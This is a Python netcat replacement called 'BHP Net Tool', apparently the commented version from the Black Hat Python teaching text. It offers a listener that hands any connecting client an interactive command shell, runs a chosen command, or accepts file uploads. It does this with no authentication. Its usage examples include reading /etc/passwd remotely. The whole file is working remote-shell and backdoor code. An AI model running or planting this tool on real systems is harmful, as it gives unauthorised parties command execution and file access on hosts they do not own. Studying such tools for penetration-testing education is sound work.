import argparse              # Used for handling command-line arguments
import socket                # Provides low-level networking interface
import shlex                 # Helps safely split command strings
import subprocess            # Used to execute system commands
import sys                   # Access system-specific parameters
import textwrap              # Helps format help text
import threading             # Used to handle multiple clients concurrently


# Function to execute system commands safely
def execute(cmd):
    cmd = cmd.strip()        # Remove extra whitespace
    if not cmd:
        return               # If command is empty, do nothing
    output = subprocess.check_output(
        shlex.split(cmd),    # Split command securely
        stderr=subprocess.STDOUT
    )
    return output.decode()   # Convert bytes output to string


# NetCat class handles both client and server behavior
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer

        # Create a TCP socket (IPv4 + TCP)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Allows reusing the same address/port without waiting
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Decide whether to act as server or client
    def run(self):
        if self.args.listen:
            self.listen()    # Run in server mode
        else:
            self.send()      # Run in client mode

    # Client-side logic
    def send(self):
        # CHANGE IP HERE: Target IP address of the server
        self.socket.connect((self.args.target, self.args.port))

        # Send initial buffer if present (e.g., piped input)
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''

                # Receive data until server stops sending
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break

                if response:
                    print(response)           # Print server response
                    buffer = input('> ')     # Take user input
                    buffer += '\n'
                    self.socket.send(buffer.encode())

        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    # Server-side logic
    def listen(self):
        # CHANGE IP HERE: IP to bind the server (0.0.0.0 for all interfaces)
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)     # Listen for up to 5 connections

        while True:
            client_socket, _ = self.socket.accept()

            # Handle each client in a separate thread
            client_thread = threading.Thread(
                target=self.handle,
                args=(client_socket,)
            )
            client_thread.start()

    # Handle connected client actions
    def handle(self, client_socket):

        # Execute a single command and return output
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # File upload functionality
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            # Save uploaded file
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)

            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        # Interactive command shell
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'<BHP:#> ')
                    while b'\n' not in cmd_buffer:
                        cmd_buffer += client_socket.recv(1024)

                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())

                    cmd_buffer = b''

                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


# Main entry point
if __name__ == '__main__':

    # Argument parser for CLI usage
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c
            netcat.py -t 192.168.1.108 -p 5555 -l -u="mytest.txt"
            netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd"
            echo "ABC" | netcat.py -t 192.168.1.108 -p 135
            netcat.py -t 192.168.1.108 -p 5555
        ''')
    )

    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen mode (server)')
    parser.add_argument('-p', '--port', type=int, default=5555, help='target port')

    # CHANGE IP HERE: Default target IP
    parser.add_argument('-t', '--target', default='192.168.1.203', help='target IP address')

    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()

    # Read input buffer if client mode
    if args.listen:
        buffer = ""
    else:
        buffer = sys.stdin.read()

    # Initialize NetCat tool
    nc = NetCat(args, buffer.encode())
    nc.run()
